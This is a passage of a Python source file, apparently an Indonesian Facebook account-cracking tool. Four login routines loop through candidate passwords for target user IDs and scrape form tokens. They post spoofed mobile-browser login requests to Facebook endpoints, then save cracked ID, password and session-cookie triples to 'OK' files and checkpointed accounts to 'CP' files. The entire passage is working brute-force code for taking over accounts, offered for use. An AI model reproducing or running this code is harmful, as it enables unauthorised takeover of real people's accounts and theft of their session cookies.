			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('╭────────────────────────────╮')
				tree = Tree('LOGIN CHECKPOINT')
				tree.add(f'{K}{idf}{P}').add(f'{K}{pw}{P}').add(f'{H}{cektahun(idf)}{P}')
				tree.add(f'{K}{ua}{P}')
				print('╰────────────────────────────╯')
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print('╭────────────────────────────╮')
				tree = Tree('LOGIN SUCCESS')
				tree.add(f'{H}{idf}{P}').add(f'{H}{pw}{P}').add(f'{H}{cektahun(idf)}{P}')
				tree.add(f'{H}{kuki}{P}').add(f'{K}{ua}{P}')
				print('╰────────────────────────────╯')
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	

def metod2(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[bold green]{idf}[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('╭────────────────────────────╮')
				tree = Tree('LOGIN CHECKPOINT')
				tree.add(f'{K}{idf}{P}').add(f'{K}{pw}{P}').add(f'{H}{cektahun(idf)}{P}')
				tree.add(f'{K}{ua}{P}')
				print('╰────────────────────────────╯')
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print('╭────────────────────────────╮')
				tree = Tree('LOGIN SUCCESS')
				tree.add(f'{H}{idf}{P}').add(f'{H}{pw}{P}').add(f'{H}{cektahun(idf)}{P}')
				tree.add(f'{H}{kuki}{P}').add(f'{K}{ua}{P}')
				print('╰────────────────────────────╯')
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def metod3(idf,pwv):
	global ok,cp,loop
	rr = random.randint 
	prog.update(des,description=f"[bold green]{idf}[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			urll = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
				'lsd': re.search('name="lsd" value="(.*?)"',str(urll.text)).group(1), 
				'jazoest': re.search('name="jazoest" value="(.*?)"',str(urll.text)).group(1), 
				'uid': idf, 
				'next': 'https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified', 
				'flow': 'login_no_pin', 
				'pass': pw,
			}
			head = {
				'Host': 'm.facebook.com',
				'content-length': str(rr(1000,3000)),
				'cache-control': 'max-age=0',
				'dpr': '3',
				'viewport-width': '980',
				'sec-ch-ua': f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'sec-ch-ua-platform-version': f'"{str(rr(5,12))}.{str(rr(1,5))}.{str(rr(1,6))}"',
				'sec-ch-prefers-color-scheme': 'light',
				'upgrade-insecure-requests': '1',
				'origin': 'https://m.facebook.com',
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'document',
				'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=data, headers=head) 
			if "checkpoint" in po.cookies.get_dict().keys():
				print('╭────────────────────────────╮')
				tree = Tree('LOGIN CHECKPOINT')
				tree.add(f'{K}{idf}{P}').add(f'{K}{pw}{P}').add(f'{H}{cektahun(idf)}{P}')
				tree.add(f'{K}{ua}{P}')
				print('╰────────────────────────────╯')
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print('╭────────────────────────────╮')
				tree = Tree('LOGIN SUCCESS')
				tree.add(f'{H}{idf}{P}').add(f'{H}{pw}{P}').add(f'{H}{cektahun(idf)}{P}')
				tree.add(f'{U}{kuki}{P}')
				print('╰────────────────────────────╯')
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def metod4(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[bold green]{idf}[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des)
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('╭────────────────────────────╮')
				tree = Tree('LOGIN CHECKPOINT')
				tree.add(f'{K}{idf}{P}').add(f'{K}{pw}{P}').add(f'{H}{cektahun(idf)}{P}')
				tree.add(f'{K}{ua}{P}')
				print('╰────────────────────────────╯')
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print('╭────────────────────────────╮')
				tree = Tree('LOGIN SUCCESS')
				tree.add(f'{H}{idf}{P}').add(f'{H}{pw}{P}').add(f'{H}{cektahun(idf)}{P}')
				tree.add(f'{U}{kuki}{P}')
				print('╰────────────────────────────╯')
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
			
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()